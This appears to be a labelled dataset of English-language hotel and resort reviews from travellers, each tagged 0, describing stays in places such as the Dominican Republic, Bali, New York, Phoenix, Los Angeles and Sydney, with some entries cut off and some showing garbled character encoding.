"had a great time! a trip to remember! my boyfriend and i just returned from the dominican republic early this morning. we stayed for one week (april 6 - 13) at the sirenis tropical suites and had a great time, despite the horribly cramped plane ride from vancouver to the domincan, and then the bumpy and long ride to the hotel. nevertheless, once we arrived at sirenis we were greeted with a refreshingly delicious drink and the staff had all of our information and room keys prepared for us. although we had asked for a room on the top floor, they gave us a ground level suite which didn't really matter in the end - stumbling up stairs when your sloshed isn't exactly safe after all!here is what you need to know before travelling to sirenis/the dominican:- the sirenis tropical/cocotal is located on the same site. a majority of the time the tropical front desk is empty (located on the left once you enter) while the cocotal front desk (located on the right) is packed full of people. if you are staying at the tropical suites, make sure you go to the correct front counter otherwise you'll wait in line for no reason just to be told to ring the service bell at the tropical front counter.- the only difference b/w tropical/cocotal is that in the tropical suites, your bedroom is seperate from the 'lounge' room, which has a small table, couch and a mini fridge. we didn't really find much use for this area, however if you like your space then this will work well for you. (also, rooms are cleaned daily and fresh towels are provided on a regular basis.)- bring lots of bug spray!!! i cannot stress this enough!!! we saw some nasty bites on some people and got quite a few ourselves - remember, you're in a tropical climate meaning a lot of mosquitos. be prepared!- make sure you pack all of the essentials (ie: shampoo, tooth paste, deoderant, etc.). the prices of these items are extremely over-priced.- food was ok. after awhile, you get sick of eating at the buffets. we went to the mexican and steakhouse a-la-carte. the mexican was really good, but seriously, don't even bother with the steakhouse unless you like eating steaks at denny's and prefer fat rather than meat on your ribs (how utterly disgusting!)- both the beach and pools are stunning! my boyfriend and i had no problem finding places to sit. of course all of the shaded areas are taken up quickly - when it's sunny, it gets damn hot! early birds get the shady spots, so don't complain if you wake up at 10:30am and there are no more shaded areas!- the staff are incredibly friendly and humble. even when they don't understand what you're saying or they can't speak proper english, they really appreciate when you try to speak spanish (eventhough its probably the worse spanish they've ever heard). they all try very hard to accomo",0

"excellent staff and location my husband and i got married in the puri santrian hotel in dec 06. we booked through thomson, and our wedding was arranged through kuoni. our original hotel was the inna grand bali in the north end of sanur. i read the reviews about it on here and phoned kuoni for a change of location explaining that if it were a normal holiday it might have been ok to stay there; but as it was our wedding...no way. we visited inna grand bali and boy were we pleased that we'd changed to the puri santrian, the contrast was night and day.the restaurants and choice of food served in the puri santrian is varied and tasty. the only thing that irritated me were the flies but you can't do anything about them, oh and the gamelan musicians who played every morning as you ate your breakfast, unfortuneately you can't do anything about them either.......the grounds of the hotel were well maintained, the gardens were manicured and the fallen flowers were continually swept up. our room was cleaned every day, with bottled water left for us each day. there was a little mini market across the road from the hotel and we stocked up on juice and crisps etc and put them in the fridge in our room. the staff were extremely friendly and honest. this end of sanur offers more shops, bars and restaurants than the inna grand bali end and isn't as run down either. the staff of the puri santrian could not have been more helpful or pleasant, one of the porters at the main gate could speak 7 languages!! we were lucky enough to persuade the honorary british consul mark wilson to be our best man.....he owns the cat fiddle restaurant across the road from the hotel and his food, entertainment and staff are also highly recommended. if anyone is planning to get married here i'd suggest this hotel without hesitation; but please organize your certificates of no impediment in the uk before you go it's much cheaper we saved about ?¢100 doing it at home.the locals have phenomenal memories, they remember you after 1 sighting. they can be a bit annoying by badgering you to come into their shops, offering manicures, massages etc. we got ripped off by the blue cabs on our last day going into denpasar, they took a really long road turning a 15 minute journey into about 45 mins, when i pointed this out the driver didn't speak english; agree a price before you get in the cab. the other thing about their cars is that they aren't all upto british mot standard, our local hotel taxi was falling to bits, i wouldn't get into a car at home in that condition, but we'd agreed the cost before it arrived. i was waiting for the wheel to fall off as we went to kuta.all in all we had the best holiday possible staying at this hotel and resort. i'd recommend this hotel to anybody, oh and the kuoni rep who organized our wedding did melinda messengers wedding for her when she got married in the bali hyatt. our holiday rep who went by the name sting gave us a beautiful bali throw for a wedding present and kuoni presented us with a beautiful hand carved ebony wall plaque of the balinese romeo juliette with our names and wedding",0

"fooled me twice!! the first time i stayed at this hotel, i resolved not to do so again. as luck would have it, we were paired up again on priceline.not much has changed since my last stay. still a very dark, modern-looking hotel with terrible soundproofing. the parking situation seems to have improved, perhaps because the lot was less crowded so i didn't have to walk as far. i knew not to get room service this time.that said, i had a much worse experience than before. why? they had no non-smoking rooms except on the club floor! i tried a smoking room once and the stench was awful. so i paid an extra $30 a night to stay on the top floor. the room was exactly the same. and although the woman at the desk was raving about the free breakfast, it was basically muffins and toast with some weak coffee. next time i will bid an extra $30 in a different area to try to avoid the sheraton, or just forget about priceline altogether. how this place gets four stars is still beyond me!",0

"good value for price stayed at the biltmore for one night. for the price we paid, the rooms were fine - bathroom a little dated, but clean and plenty of towels. bed was comfortable and the sheets were definitely clean and crisp. having read some of the reviews, i checked! also, didn't experience the issues with thin walls mentioned in other reviews. overall, no complaints. the concierge was helpful and recommended a great little steakhouse. for the time i was in la, this was a good choice. it isn't a modern, chic boutique, but it does have masses of character if that is what you like. a grand old lady.",0

"kind of scary when arriving past dark my daughter and i booked on this island thinking it would be closer to the airport for my departure early in the morning. it isn't really closer than kowloon, since you have to go over the mountain by taxi or bus. we arrived after dark by taxi, and since there is no beach front road, we had to walk down a one block alley with our luggage. it was dark and there were street people sleeping in the alley, a bit scarry for 2 american females. once we got to the hotel, it was okay. not the best, but i was tired of spending money, and it was cheap. somewhat like a motel 6 in the usa. once you figure in the taxi fare, (yes, i know we could have taken the ferry, but we had a lot of luggage and thought a taxi was the way to go) both to the hotel and back again in the morning, we could have stayed at the regal at the airport. we only stayed the one night, it was okay, but last minute booking at the regal airport hotel would have been just as cheap, without the hassel of the taxi. i will say that it would be a nice place to stay with a family, a good base to see hong kong from. cheap, not awful, and the people were very friendly. i would like to have seen the place in the day time. we arrived at dark and left in the dark. up",0

"ok stay had to attend a conference in phoenix and stayed at the hyatt regency hotel. it was conveniently across the street from the convention center. normally, the hyatt concierge will assist convention exhibiters by carrying over stuff for the booths. however, the convention hall union was fighting with the hyatt and would not allow them to help us, the concierge did allow us to use their hand truck to wheel our stuff over. the area round the hotel was ok, i didné¥?? find to do in the immediate vicinity, but the phoenix suns stadium and diamondbacks stadium were within walking and short taxi ride distance. the hotel lobby was clean, and the carpets in the hallways were mostly clean and free of stains. the room was good, carpet was neat, bathroom was clean and room service showed up everyday.we really wanted to see the desert before we left. the concierge gave us a map with the closest parks. the one we traveled to was at the end of central (i cané¥?? remember the name.) it took about 20 minutes to get there and the views were amazing!! we spent 3 hours traveling around the park, i would definitely recommend taking a trip.the hotel was good and i would definitely stay there again.",0

"residence long term stay my wife and i stayed at the residence inn on tudor wharf, january 16th to march 15th, 2006, while i was undergoing treatment at massachusetts general hospital.we found the hotel to be clean and comfortable and the staff very competent and friendly.the location at tudor wharf makes it fairly convenient to walk to the north end for all different types of dinning and over to the north station for access to the é¥?·­é¥? bostoné¥??? metro. having said that, it does get rather chilly during the boston winter to be walking.a few observations and recommendations:expect the residence to get noisy and perhaps a little rowdy on the weekends with people coming in for the weekend and major sporting events over at banknorth gardens. breakfast, when the hotel is full can be a real challenge.while the residence does maintain a é¥?·¢arketé¥?of limited food items, expect to pay for the convenience. a pint of ice cream that costs around $3.89 at a food store goes for $6.00. a soda that goes for $1.25, is $2.00. a complete supermarket, é¥?·ohnnieé¥??? foodmaster,é¥?can be found just a short 10 minute walk up main street, along with a post office, dunkiné¥?donuts, friendly ice cream, a pizza place and other stores.the complimentary breakfast has variety and is very good. however, it is redundant, and after a short time, becomes very boring. on the weekends, for a change of pace, would recommend breakfast again up main street at é¥?·²arren tavern.é¥?br/the nightly monday through thursday complimentary é¥?¸inger foodé¥?is a real crap shoot - sometimes good, and sometimes, best to avoid. food items would be a lot better if the food service staff would put some fire under the serving dishes to maintain food temperature.for local restaurants, go across the charles river bridge and take your pick. personally we found é¥?·²arren taverné¥?around a seven minute walk up main street on the residence side of the river to be our favorite. good food at reasonable prices. avoid é¥?9 restauranté¥?in the shopping center - we found it to be a big disappointment.a small point here, but the complimentary bags of coffee in the rooms are way too much coffee for room coffee pots and tend to brew over, leaving a lot of grounds in your cup. suggest not using the whole bag. the residence should also consider installing larger trash cans in the rooms.we did not bring a car to boston, but hotel parking is like $25.00 a day. there are very few places in the boston area where you do not have to pay big bucks to park, even for an hour or two. expect to pay around $20.00 for a taxi to logan airport even though you can see the logan airport control tower across the harbor from the hotel.the u. s. park service bunker hill visitors center is located just down the street from the hotel and features a presentation é¥?·­he whites of their eyes.é¥?i would avoid this presentation. it is not a movie, but a é¥?¸edia presentation,é¥?which is very out",0

"beautiful decor we stayed at this hyatt for two nights earlier this month while on an all-girls trip to the american girl store. driving from disneyland, we called the hotel to find out how long it would take us to get there. we were told, two and a half hours! we were incredulous, and sure enough, it took us less than an hour to arrive. when we checked in, we asked how long it would take for us to get to the american girl store in the grove. now, it's only about 4 miles away, but we were told, forty-five minutes!! maybe they gauge these travel times based on peak travel with multiple car accidents along the way, but their estimates were so far off from reality they weren't helpful at all.we were taken aback by the valet parking charge of $31 per day. we were told about alternate parking but it would be about $20 with no in and out priveleges. both a parking valet and front desk clerk told us it would cost us $20 each and every time we parked and left. because we arrived late and just wanted to get some sleep, we parked at the hotel and didn't check out the veracity of their information regarding the other parking lot. as another review mentioned, the front parking area is quite congested. be sure to call ahead to have your car brought around if you use their parking.everything about the hotel is beautiful from the lobby to the hallways to the rooms themselves. the beds were comfortable, room decor was lovely. i would probably stay there again but cringe at the thought of the parking charge.we used the pool one evening but it closes at 10. i think that's a bit early, considering that loud voices were coming from the outdoor bar area well past midnight. since our visit centered around visiting the grove and american girl store, the hotel's location was perfect. it took us about 20 minutes to get where we were going each morning.",0

"good hotel/location but needs some improvement this hotel is now a hyatt regency although it's unlike most impeccable hyatts. the hotel location is great as it is minutes from beverly hills and across the street from the century city shopping center. the rooms have lcd tvs , the bed is comfortable and for the most part clean (sheets need to replaced, some are worn out). i had a room facing the back of the hotel with a view of the (very, very distant) ocean. i didn't rate this a 4 star because the front desk staff is not very knowledgeable (didn't even know how to print out a folio!) and when you ask them for anything they just didn't know or had to always ask someone else for the answer. the club room's continental breakfast is a joke (muffins and juice) so i wouldn't pay extra to include that in the stay and the staff is not very good about replinishing the food/drinks/plates/napkins. often times i would go in the room to find only muffin crumbs and no plates. the bellmen and valet staff however were very efficient and consistent in providing good service. i think if they train the front staff and revamped the club room the hotel would get higher marks.",0

"Great place - great price! My 2 daughters (ages 25 and 21) and I stayed here the first weekend in June. I had previously e-mailed the hotel to request early check in and when we arrived our room was ready for us! (about 5 hours before check-in time!) Front desk staff was very friendly and cordial. Very nice room - queen bed with tons of pillows on it to choose from, sofa(bed) and chair, small desk/dining table with seating for 2 and kitchen. Very large room for NY. We stayed on the 7th floor (of 34) and had a view of the hotel next door out the window. It really didn't matter though as we were really only in the room long enough to drop off packages and go out shopping some more, shower and change clothes before dinner and then sleep there! Bathroom was small but shower had a wonderful large showerhead! Hotel is close to subways at 34th/6th and also at 42nd/6th. Taxi right outside the door of hotel.We did have one slight problem while we were there - arrived back at hotel at 11:45pm - exhausted since we had been up since 5:45am and had probably walked about 8 miles that day! Got into bed and the fire alarm went off at the hotel. Management came on and said they were investigating and to stay tuned for further announcements. They made up",0

"no better location!!! from start to finish we had a great stay at this hotel! even before we arrived, having emailed the hotel directly with questions - the staff responded straight away were very helpful. arriving from australia being too early to check in (but we could have if the room hadn't have had someone else staying in it the previous night), the staff were happy to hold our suitcases in a secure room while we went out started exploring the walk of fame. the location is fantastic - perfect for weary travellers who have spent their days out about. so close to the subway (jump on it travel 3 mins to universal studios), or straight through the mall across the road you're at the historic very fabulous el capitan theatre. ask at reception about their discounted tickets for universal studios - they saved us $13 per entry. while the suite is a little old - it was clean very large it's nice to have room to spread out. having the free internet access was also a bonus. i would highly recommend this hotel - it's great value for money you'll love the location. thanks again to the fabulous staff for being so helpful friendly during our stay!!",0
"feel like a new yorker ! stayed here on a shopping/sightseeing/semi-romantic break in january 2006. booked through the phone/hotel website. the man who took my booking was not too friendly but when we got there we received a nice welcome and a room ready for us. we had booked a suite a few houses down from the main hotel which was very good value considering that 199$ will pay for a shoebox in one of teh corporate hotels. the suite was a studio apartment situated in a small brownstone house, with a fully equipped kitchen, a marble bathroom with a powerful shower, a bed (could have been more comfy) and a pleasant seating area. it had really interesting art on the walls, and made the place unique. everything we would possibly want was just around the corner, and the reception staff was a great source of local information. it was nice to come in from the cold from some hardcore sightseeing with a box of cupcakes and make a nice hot coffee or buy one from around the corner and lounge around before going out at night... the subway stop is around the corner, and the area is very pleasant and interesting. i would also highly recommend the 'dish' cafe where the receptionist sent us on our first afternoon. altogether, i would always stay there again. i stayed at the algonquin two years previously for the same money, and, it looks much grander, but you get much less comfort and style for what you pay. last not least, chelsea is a much more pleasant area to stay in.",0

"royal palms, not our old standby anymore! well, all good things must come to an end. so be our eight year run at the royal palms resort in phoenix. we thought about changing our annual hotel destination this year, 2006 but decided, why change something that has usually been good? well, we found out why. the front desk staff needs some training and they need to learn how to treat a guest who has been a faithful to their hotel for this many return visits. first, our room choice had been requested for a month prior to our trip...then on the day of arrival a very specific room was asked for and was available, only to be given away 5 minutes before we were given our room, after we waited all day for the room to be cleaned etc. then we were told no roll aways anymore...all of our previous visits we have had one. so this was an issue this year... new rule.that was a problem since the hotel was sold out for the night. we were unable to have beds for all guests in our room, then the staff was not accomodating in finding an alternative. they offered the ritz, which is not a resort/spa. we had to find our own alternative accomodations at 10 p.m. friday night and it basically ruined our evening and the next day as we had to check out and move the next day although moving to the phoenician was a pleasant one. we have always had problems with the bills being incorrect at royal palms (we did for our one night too!) and the pool service, they had one nice guy at the rp taking care of the entire pool, when they knew they were entirely booked at their hotel. he was overworked and a little cranky! but we understood his plight. we just dont spend that kind of money to relax for a weekend away to be treated so poorly and with such disrespect for our vacation time. we will definitely be writing to the royal palms to let them know their returning guests will be no longer...not that they care! we will be happy to go to the phoenician where our rooms were large and spacious with superb, expediant service in every arena of the hotel. they may be a little larger, but wow, the service there is impeccable. p.s. no maid service was knocking on doors at 8:30 on a weekend morning at the phoenician, like at the royal palms...they need a few lessons on luxury accomodations..as we were checking out of the rp, we noticed a lovely older couple who were wondering why they did not have the casita they had reserved 6 months in advance...they were very upset as well...they were heading to the four seasons!we will definitely not go back, too many other mishaps to list. just lots of disappointments!",0

"perfect stayed two nights, over the memorial day weekend. romantic, quiet and beautiful. the casitas are well maintained with attention to detail. the beds are extremely comfortable although we could have used a step to get on them (thick mattresses). rooms are not overly large or maybe it was the size of the funishings that filled it. i would say the rooms are overly furnished. appreciated the staff attentiveness, always eager to answer any questions about both the resort and area attractions...etc. smoking is not permitted in any of the rooms, but decorative ashtrays are placed on both the front and rear patios, making this a non-issue for smokers. highly recommend this property for those that can afford it.",0

"one night was not enough trust me, you will not be disappointed if you stay at this hotel. what can i say about the best western pioneer square hotel that hasn't already been said? from the welcome to seattle from the girls at reception to the have a good trip from the bell captain, this hotel gets my vote for being the best.at the end of a long tiring day having travelled by plane and boat to reach seattle, all my cares disappeared as soon as i opened the door to my hotel room. the large room was beautifully decorated with the king size bed taking pride of place. it looked so peaceful and welcoming with the period furniture and matching appointments that i couldn't wait to unpack and relax with a cup of tea. the lighting was excellent with not a 40 watt bulb evident. the towels were plentiful and fluffy and there was loads of room in the bathroom to lay out my toiletries. i thought the framed picture on the wall was a nice homey touch. the room was quiet and there was no noise to disturb a dreamless sleep that night. in fact, i was glad the next morning i had set my alarm the night before.i enjoyed my continental breakfast the next morning of toast, jam, yoghurt, fruit and coffee. there was also cold cereals, danish and muffins on offer. i learned that bus transportation is free in the pioneer square area and the bus stop is just steps away from the hotel entrance on yesler. however, since i wanted to explore on foot it was an easy walk to the uwajimaya shopping complex in chinatown - a delightful place. although my room rate was a little more than i normally pay, in retrospect my one night's stay was worth every cent and i fully intend to make a return visit in the future.",0

"nice stay overall i was traveling as a single woman, and found this hotel more than satisfactory on most counts. i stayed in south pointe, and was a little nervous about using the elevator at night because the lighting was so poor both from the parking area and, especially, up on the 4th floor. i hope they will consider improving the lighting as soon as possible.as for my suite, i couldn't have been more comfortable. even the prints on the walls were interesting and atttractive. i felt pampered with the bedding, the furniture, and my own living room. early in the morning, i enjoyed the canopy view of the tree-tops from my balcony, and even took some pictures of the birds in the trees.the water park was awesome!! even grown-ups without kids were enjoying the pools and the lazy river. the big pool with the waterfall was wonderful, and you could quickly cool off under that.prices at the slim pickens grill were rather high - $16 for a hot dog and a pina colada smoothie, but it was convenient. the hole in the wall restaurant was very good. i had a nice dinner of ribs (mouth-watering), with the best biscuits i've had in a long time. breakfast was also good, and the staff was very friendly.the conciege was very helpful, and had printed-out directions for the heard museum and the car rental return at the airport. the location of the hotel made it easy to travel anywhere in the area.all in all, i had a great stay, and would definitely return again someday.",0

(I was travelling for three weeks on a combination of business and pleasure. Hence, the extra luggage). If you're two adults and you're brigning more than one carry-on luggage each between the two of you, may I advice that you book at least a Deluxe (make that an Executive) room? I can almost guarantee that a Superior room will not have enough space to comfortably fit the two of you and all your luggage.That having been said, Hotel Mela's superior rooms are actually quite well-sized for New York at its price range. As a result, one can't really complain about the size of the rooms.As for the room itself, it was actually nicely equipped and very clean. It had a 26-inch LCD TV (large enough without overpowering the room, not to mention that the channel selection included HBO), mini-fridge, fully stocked mini-bar, a closet and a safe large enough to accomo",0

"reasonable value for money hotels in sf are not cheap,and room sizes are not overly big,so a pretty tiny room for $180 was no big surprise. valet parking for $40 per night seems a bit steep,but at least the service was efficient and quick.overall the tuscan inn is a nice hotel. very clean,well maintained,with efficient,if not overly friendly service. the couple of faults with room features were fixed very quickly,which was a nice change from the interminable wait often suffered in european properties.the hotel makes a big thing of the coffee/bisc service in the morning,and this is quite nice. i'd say that,as far as the evening (5 to 6 ) wine service is concerned,if you happen to be in the hotel,it's fine. but not worth rushing back from a day out for.breakfast was ok,but expensive. much better option is pats cafe,just round the corner nr the cable car terminus.",0

"little gem in new york stayed in the chelsea lodge for 4 nights in november 2006. great little budget hotel, its like living as a new yorker. looks just like an ordinary brownstone from the outside so make sure you've got good directions if taking a cab to it. felt safe in the area, there is a police station a few streets up and surrounded by eateries and good bars, you're never short of a place to eat or drink. recommend the dallas bbq and the galaxy diner for eats, flight 151 bar for drinks. subway close by and within reasonable walking to madison square garden / times square / midtown area.rooms pretty compact but they have good showers and tv's. decor a bit weird (lots of ducks and red indian heads) but not offensive! shared bathrooms not an issue, they were never both in use and always spotless. didn't have any probs with the desk staff, always polite and helpful. would certainly stay again.",0

"great time had by all! we stayed at squaw peak june 04 -06, 2004 and had a great time! we even got a early check-in at noon on arrival day, and the front desk clerk was very kind. we had a 2-room suite in the south point, very close to their awesome water park river ranch. on sat. nights during the summer, they show dive-in movies at 7:30 p.m - you can watch the movie while in the pool or sit on the deck chairs, complete with popcorn. we ate from the pool food/bar which was fine, and then at the hole in the wall for dinner and then breakfast. it is not that overpriced compared to any full-service hotel. if you want to purchase the hotel service package for $9, you receive an additional admission to the water park (we had 4 with our room), unlimited use of the fitness facility, miniature golf, 2-for 1 ice cream, etc. we will definitley stay here again.",0
"enjoyed our stay we just stayed at the legacy golf resort for a week from october 3rd to october 10th. it was our first time to arizona and really enjoyed it. our room was immaculate and the kitchen was stocked with everything we needed. we ate breakfast in the condo every morning and had lunch at the resort twice. the food was excellent in the restaurant. we drove to the grand canyon and sedona for a couple of days. amazing scenery!! we did lots of shopping and really enjoyed shopping at the anthem mills outlet about a 30 minute drive north of the legacy. we did the walk at 9:00 a.m. two of the mornings we were there with jeannie! it was a little over an hr. and we were able to chat and get some exercise in while seeing more of the area. we used the pool area. they provided lots of towels and lounges and umbrellas for shade.they don't allow you to bring food into the pool area and we felt sorry for the families with young children because they were told they couldn't give their children their snacks. they could only eat the food sold in the pool area. there are lots of good restaurants within driving distance from the legacy and also scottsdale was fun to visit and not a far drive. i think we will definitely return to the legacy but would make sure we didn't get room 10113 again. it was backing on to the cleaning supply room and we were disturbed numerous times in our sleep by staff going in and out of this room. when they were talking on their walkie talkies it was like they were in the room with us!! we could have complained but we were too lazy to change our room by the time we realized this was a problem.also, i just want to add the staff were all very friendly and service was very good.",0

"fantastic location after reading some reviews, i was a bit aprehensive of what this hotel was going to be like, read about dirty rooms and bugs etc, but our room, although extremely small, was clean and bright. i did request a room at the back (advice from previous reviews) and a fan in the room, we got a room on the side which was still quite noisy, but after so much walking in the day we didn't find it a great problem. found the hotel entrance hard to find initially until we realised the lobby is actually situated in the betty boop diner.i stayed here with my 16year old daughter and we really enjoyed it, the location is great for cable cars, shopping and generally getting around san fran, there is a walgreens next door also. would definatly stay here again when we go back to san fran.",0

"excellent except for the construction work going on. stayed at the century plaza for 3 nights. got a room on the ph (penthouse) level at the rear of the building with good views. was a little surprised to get a good room so easily, as we got it cheap on travelocity, we just assumed they were quiet. found reason next morning when the building site came alive around 6am. no mention of it when booking or from the hotel reception when checking in. we didn't complain (although we did mention it at checkout) as we were due to be up early the next 2 mornings anyway, but it would have been nice to know. the location of the hotel is fairy good considering you are basically in a financial are with a few office towers. the westfield shopping centre, which was across the street, was ideal to grab some food and had a macys and a bloomingdales amongst others. it was a 15-20 minute walk to rodeo drive and the area seemed safe enough. also, a bus form the big blue bus company leaves from around the corner to go to santa monica. it takes about 30-40 mins dependant on traffic but only cost 75c per person one way, an absolute bargain! you can get the details and location of the bus stop from the concierge who we found most helpful as we had no car and needed to know where we could get to easily on foot or with public transport. overall an enjoyable stay, but if i was going back to la, i would probably stay somewhere else just to compare the location.",0

"great budget stay excellent place to stay if you want to be at the heart of the tourist area. we stayed for four nights and were really happy with our choice because....- easy access to public transportation- complementary breakfast is a bonus - nothing fancy but good way to fuel up before cycling the golden gate!- our room was on the eighth floor - highly recommend requesting this as it was very quiet- plenty of hot water, comfy bed, helpful staff etc etcoverall an excellent place to stay, and in response to other comments, yes the elevator is slow but how much of a hurry do you really have to be in? and re. the strong smell in the hotel - it didn't take much deduction to realize that this is from the 'lush' shop next door! we would definitely recommend the stratford as a budget stay. $90/night very well spent.",0

"only if you need to be downtown and aren't hiring a car the front counter staff are extremely professional, but far from polite if you have an issue that's out of the ordinary. the concierge is impossible to get a hold of. don't hire a car if your staying here, parking is $40 usd per night plus valet tips are expected.the hotel itself is well presented and clean. don't expect a fridge let alone a mini-bar. the lower level staff (cleaners, chefs) barely speak english so be sure to be clear when giving instructions.unless you have business in downtown los angeles, this is not there place to stay. most tourist spots are north-west of downtown (with the exception of disneyland).only stay here if you've won a prize or don't plan to leave your hotel room for the entire stay.",0

"ok, vacation... ok, so weeks before traveling, i did the same as you, i logged onto trip advisor to see what other travelers had to say. just like you will, i read lots of good bad things, some of which concerned me and some of which did not. my family i travel quite often so we are very familiar with what to expect at these resorts; food, drinks, rooms, towels, service, etc...youé¥??l always find something to complain about, so traveling with an open mind is key to having a great time. here is the short of it:1) check in; we arrived around 4:30pm, check in was done in minutes, no waiting, no long lines. i must warn you, everyone gets a colored bracelet which id's the area in which you are staying what facilities you are allowed to use. this includes pools, bars, buffets, etc. suggestion, avoid the hassle of being turned down, hang around the big pool by the beach, no one seems to care what color bracelet you have.2) reservations; upon check in, head directly to public relations book your reservations, you are only allowed 3 restaurants in total no matter what section you stay in or length of stay. a must try: italian, japanese rodizio (most popular amongst travelers our favorites). tip: if having difficulty with bookings, check daily cancellations, they doné¥?? tell you this.3) rooms; if you are given a suite near the high 30é¥???, beware! this in the heart of a very noisy construction zone (mountains of rocks, dirt, debris, dump trucks, sweaty men, dust covered patio table chairs you can literally taste the dust in the air) not pleasant at all.if you find that your room has a slight musty odor, doné¥?? worry, this is mainly because the power in the room is off until you insert a key in the slot near the door which activates both the lights and air-conditioning. the odor will be gone before you know. suggestion, bring a plug-in room air-freshner it helps.4) food; ample, you will always find plenty, not always the best selections, but keep in mind you are not home. food is always fresh and selections vary. tip for those late sleepers; doné¥?? expect bacon or sausage with your breakfast if you arrive past 10am, you will have to settle for cut-up hotdogs instead. drinks; are mediocre, most stick with the beer.5) pool/beach lounges; if you want to nice spot in the hot sun, no need to rush, if you want a combination of sun and shade, prepare to wake up at least by no later than 6am to reserve your spot.6) daily activities: lots are held by the main pool, if you prefer it quieter and low-key i suggest you use one of the smaller pools located in the center of the resort. a handful of the play makers are very out-going fun, although most lacked personality and the friendly quality weé¥???e grown accustomed to. most importantly, they are not pushy which is nice if you are not in the mood.7) night life; this one is rather long. all in all, this was the worst entertainment ié¥???e experienced in all my travels, definitely lacking structure. leté¥??? start with the shows; doné¥?? get too upset if you miss a few or arrive late, shows definitely need work, they are somewhat entertaining, but lack audience participation and the high-energy you might have experienced at other resorts. definitely catch the lion king; it was one of their best. the kids show at the theatre runs 8:30 é¥?9pm, the main shows runs 9pm-11pm, simultaneously, there is a pianist or some type of musician at the lobby bar. at eleven both the theatre and lobby shut down. why they shut the lobby down, i have no idea; 11pm is way too early. so if you just want to hang out, talk and enjoy drinks, you cané¥?? do it here, youé¥??l have to head to the pueblo principe where they have shops, vendors, a karaoke bar, a casino, a show which runs until 12am a nightclub that open at 12am. vendors tend to be pushy, so browsing can be annoying stressful. the pueblo principe show just like the theatre show is just ok, nothing special. mostly, a band playing and some dancing nothing more. beware, if you order drinks in the casino, you must pay cash as they are not included in the all-inclusive. the karaoke bar is full of loud drunk teens, if thaté¥??? your thing, then youé¥??l have a blast. as for the casino, not a gambler so cané¥?? share much. now for the club which opens at midnight; if you are traveling with teens, ages 13 é¥?18, be prepared to have this damper your night life. there is absolutely nothing which caters to this age group. young teens are not allowed in the club at all whatsoever. some girls may make it in, but most do not, boys, not a chance. if you are 18 bring along your passport, even if you are of age, you may be turned away just because you look too young. a license although it displays your picture and birth",0

thanks for the wonderful stay i stayed at the westin century plaza from the 28th june 04 till the 2nd july 04 to celebrate part of my honeymoon. i did not advise them but as soon as they got to know via the concierge they send me a champagne bottle up to the room for free. the concierge were really helpful and very kind whenever we needed directions or places to visit.the room was done up really nicely and room service was up at the room within 15mins of calling. keep up the good work. i will surely return.,0
"Truly comment by 10-year-traveller I have over 10 years tavelling experience in Hong Kong and I have stayed in different hotels in Kowloon side and Hong Kong side, such as Shangri-La, Conrad, JWM, Four Season, Kowloon Hotel and Marco Polo; I think Hotel LKF is the best hotel and they can porivde the best service even better than Four Season Hotel does.My company has the corporate account in over 10 hotels in Kowloon and Hong Kong Island (Central  Admiralty). Only Hotel LKF can provide the most stable and reasonable price (Also always upgrade me to Deluxe room plus special gift EVERY TIMES). I went to HK with my wife in last year. Even my wife's birthday is 2 days after the check-out ",0

"you get what you pay for! keep the subject line in mind when thinking about booking this hotel. i hope other people have had great experiences as seattle is so great but that was not my experience. i booked a non smoking room because, yes, us difficult californians don't like the smell of smoke. my room reaked of smoke. obviously, the people who stayed there before probably smoked in the room every day. the manager, although understanding, said we can't control that, and we have no other room to give you. (which was true in august in seattle.) the next day, the electric on one wall went out and i was left with no reading lights. i was informed that there was nothing they could do about this until monday but on sunday the lights did come back on. yes, they did give me a small discount but that was not the point. when i go to a city a don't want to have conflict regarding my room. the kids at the front desk were very nice but they didn't know what to do. anyway, not all best westerns are bad but it really depends on the individual owner. if you have the money stay at the westins as they offer a very consistent level of room and service. this makes your stay so much nicer. i've learned my lesson.",0

"goregeous hotel, fabulous restaurant i stayed here for two days while in town for a conference - someone else from work had picked it out but they did a great job! this place is expensive ($429, although i think i had a free upgrade), but i would return on my own dime to stay there again because it is so wonderful. the property is absolutely gorgeous, and i stayed in room 123 - large king bed, gas fireplace, massive beautiful bathroom with clawfoot tub and dual-faucet shower, great products from the spa onsite, and two patios, one very private with a water fountain. the spa is wonderful - i had one of the best massages of my life from ryan. we ate at the restaurant afterward and had a fabulous meal and bottle of wine. the wine list is great fun - whoever put it together has added helpful comments and wine publication ratings. the only way my stay could have been better is if i could have skipped my conference and spent the whole time onsite.",0

"reasonable airport hotel for a short stay we stayed at the mercure sydney airport for two nights, starting new year's eve 2008. because of the insane prices of sydney hotels on new year's, the price we paid for the hotel was reasonable, but only by comparison. cheaper than downtown was about the best we could say about our rate.overall, the hotel was a comfortable and passable site for a quick stay. if you're only visiting sydney briefly, or need accessibility to the airport or long-distance rail, the mercure may be a good choice.location: literally seconds from sydney international, the hotel is within view of the airport's international arrivals area. the hotel has a shuttle available on a fixed schedule, but a cab ride is only $5 and may be more efficient. the hotel is located adjacent to a medium-sized park which is a pleasant place to get some fresh air on nice days, with biking/jogging trails around a small lagoon, and public playground equipment and barbeque grills available. about a 10 minute walk from the hotel is the wolli creek train station, with direct service to downtown and other popular areas like bondi junction. trains to/from wolli creek are less than half the cost of trains directly to the airport, despite being on the same line and less than a mile away!rooms: the rooms are a bit",0
"would stay again? absolutely first let me start by saying to anyone looking for a great room, staff, location, and fun this is your dream vacation spot. i've travel mostly every where in the united states and never found the family like world that this hotel has for its guest and staff. my family felt like we had family members we never knew about. i hope i get all the names right the hotel manager and assist were great i think their names were denise and ammar. never saw denise much but ammar was very helpful telling us everything about nyc and what to do and not to do. he very well knows his stuff. also eddy never talked much but still helpful. my son talked with issac at night because of the time difference he was never tried. cané¥?? forget michael very nice helped with luggage when we arrived he held it for us we got in early. he took it up to the room and helped us with it upon check out. the housekeeping girls were very friendly. the cleanliness of the room was ok despite a little dirt here and there which we possible made but overall the room was very nice and relaxed like home. location was great we got a chance to see everything in just one week. it was the first time for the family in nyc we are looking to come back in 2009. cané¥?? wait the kids have already started packing a year in advance lol!!!!!",0

